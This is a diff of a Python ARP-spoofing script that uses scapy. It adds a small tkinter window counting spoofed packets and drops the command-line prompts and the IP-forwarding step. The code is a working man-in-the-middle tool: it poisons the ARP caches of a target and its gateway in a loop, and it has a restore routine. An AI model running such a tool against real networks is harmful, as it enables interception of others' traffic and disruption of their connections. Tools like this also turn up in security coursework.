@@ -3,20 +3,8 @@
 import scapy.all as scapy
 import time
 import sys
-# import optparse
-
-
-# def get_arguments():
-#     parser = optparse.OptionParser()
-#     parser.add_option("-t", "--target", dest="target", help="Target ip address")
-#     parser.add_option("-s", "--source", dest="source", help="Source ip address")
-#     (options, arguments) = parser.parse_args()
-
-#     if not options.target:
-#         parser.error("[-] Please specify target IP , use --help for more.")
-#     elif not options.source:
-#         parser.error("[-] Please specify source IP , use --help for more.")
-#     return options
+from tkinter import *
+import threading
 
 
 def get_mac(ip):
@@ -24,7 +12,6 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=2)[0]
-    # print(answered_list)
     try:
         return answered_list[0][1].hwsrc
     except: return -1
@@ -51,44 +38,42 @@ def restore(destination_ip, source_ip):
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, verbose=False, count=4)
 
+def send_packets(target_ip, gateway_ip, packets, window):
+    packets_sent = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packets_sent = packets_sent + 2
+       
+        packets.delete(1.18, END)
+        packets.insert(END, packets_sent)
+        window.update_idletasks()
+       
+        time.sleep(2)
 
-# options = get_arguments()
-# target_ip_ = options.target
-# gateway_ip = options.source
+def show_gui(target_ip, gateway_ip):
+    window = Tk()
+    window.title("ARP Spoof")
+    window.geometry('300x50')
+
+    # Label(window, text = "[+] Packets Sent: ").pack()
+    packets = Text(window, bg = "black", font= "white")
+    packets.pack()
+    packets.insert(END, "[+] Packets Sent: ")
+    send_packets(target_ip, gateway_ip, packets, window)
+    window.mainloop()
 
 
-# try:
-#     packets_sent = 0
-#     while True:
-#         spoof(target_ip_, gateway_ip)
-#         spoof(gateway_ip, target_ip_)
-#         packets_sent = packets_sent + 2
-#         print(("\r[+] Packets sent:" + str(packets_sent)), end=' ')
-#         sys.stdout.flush()
-#         time.sleep(2)
 
-# except KeyboardInterrupt:
-#     print ("\n[-] Quitting.................")
-#     restore(target_ip_, gateway_ip)
-#     restore(gateway_ip, target_ip_)
-
-def arp_run():
+def arp_run(target_ip,gateway_ip):
     current = "arpspoof"
     try:
-        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
-        packets_sent = 0
-        target_ip = input("(arpspoof) Enter Target IP >> ")
-        # target_ip = target_ip(" ")
-        print(target_ip)
-        gateway_ip = input("(arpspoof) Enter Gateway IP >> ")
-        # gateway_ip = gateway_ip(" ")
-        while True:
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            packets_sent = packets_sent + 2
-            print(("\r[+] Packets sent:" + str(packets_sent)), end=' ')
-            sys.stdout.flush()
-            time.sleep(2)
+        # subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        # target_ip = input("(arpspoof) Enter Target IP >> ")
+        # gateway_ip = input("(arpspoof) Enter Gateway IP >> ")
+        show_gui(target_ip, gateway_ip)
+        
+        
 
     except KeyboardInterrupt:
             print ("\n[-] Quitting.................")
